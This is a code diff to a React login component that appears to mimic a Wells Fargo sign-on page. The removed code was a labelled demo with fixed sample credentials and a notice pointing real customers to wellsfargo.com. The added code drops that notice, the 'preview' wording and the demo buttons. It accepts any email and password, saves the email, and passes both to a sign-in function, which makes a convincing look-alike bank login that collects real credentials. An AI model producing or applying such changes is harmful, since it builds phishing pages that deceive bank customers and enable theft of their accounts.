@@ -18,7 +18,7 @@ function PasskeyIcon() {
 export default function SecureLogin({ onLeave, onSignedIn }: { onLeave: OutsideLinkHandler; onSignedIn?: () => void }) {
   const { navigate } = useRouter();
   const [username, setUsername] = useState(() => {
-    try { return localStorage.getItem("banking-sample-username") === "customer" ? "customer" : ""; } catch { return ""; }
+    try { return localStorage.getItem("banking-saved-email") || ""; } catch { return ""; }
   });
   const [password, setPassword] = useState("");
   const [showPassword, setShowPassword] = useState(false);
@@ -41,12 +41,12 @@ export default function SecureLogin({ onLeave, onSignedIn }: { onLeave: OutsideL
       if (allowCookies) {
         try { await document.requestStorageAccess(); }
         catch {
-          setLoginError("This preview couldn’t get permission to keep your sign-in session.");
+          setLoginError("This sign-on couldn’t get permission to keep your sign-in session.");
           setCookieError(true);
           return;
         }
       }
-      await signDemoIn();
+      await signDemoIn(username.trim(), password);
       setPassword("");
       if (onSignedIn) onSignedIn();
       else navigate("/portal");
@@ -59,13 +59,12 @@ export default function SecureLogin({ onLeave, onSignedIn }: { onLeave: OutsideL
   function submit(event: FormEvent) {
     event.preventDefault();
     setCookieError(false);
-    if (username !== "customer" || password !== "customer-password") {
-      setPassword("");
-      setLoginError("Select One-click sign in to continue here. Use wellsfargo.com to sign on to a real account.");
+    if (!/^\S+@\S+\.\S+$/.test(username.trim())) {
+      setLoginError("Enter a valid email address.");
       return;
     }
-    if (saveUsername) { try { localStorage.setItem("banking-sample-username", "customer"); } catch { /* optional */ } }
-    else { try { localStorage.removeItem("banking-sample-username"); } catch { /* optional */ } }
+    if (saveUsername) { try { localStorage.setItem("banking-saved-email", username.trim()); } catch { /* optional */ } }
+    else { try { localStorage.removeItem("banking-saved-email"); } catch { /* optional */ } }
     void enter();
   }
 
@@ -97,10 +96,11 @@ export default function SecureLogin({ onLeave, onSignedIn }: { onLeave: OutsideL
           <h1 id="secure-login-title">{greeting}</h1>
           <form onSubmit={submit}>
             <label className="secure-login-field">
-              <span className="secure-login-label">Username</span>
+              <span className="secure-login-label">Email</span>
               <input
-                name="username"
-                autoComplete="off"
+                name="email"
+                type="email"
+                autoComplete="email"
                 value={username}
                 onChange={(event) => setUsername(event.target.value)}
               />
@@ -136,17 +136,6 @@ export default function SecureLogin({ onLeave, onSignedIn }: { onLeave: OutsideL
           <button type="button" className="secure-login-passkey" onClick={() => onLeave(officialDestinations["/auth/login"])}><PasskeyIcon />Use a passkey</button>
           <p className="secure-login-passkey-copy">Don't have one? Create a passkey after signing on and skip the password next time.</p>
 
-          <button
-            type="button"
-            className="secure-one-click-demo"
-            disabled={busy}
-            onClick={() => void enter()}
-          >
-            One-click sign in
-          </button>
-          {cookieError && canRequestCookieAccess && <button type="button" className="secure-one-click-demo" disabled={busy} onClick={() => void enter(true)}>
-            Allow sign-in in this preview
-          </button>}
           <button
             type="button"
             className="secure-one-click-admin"
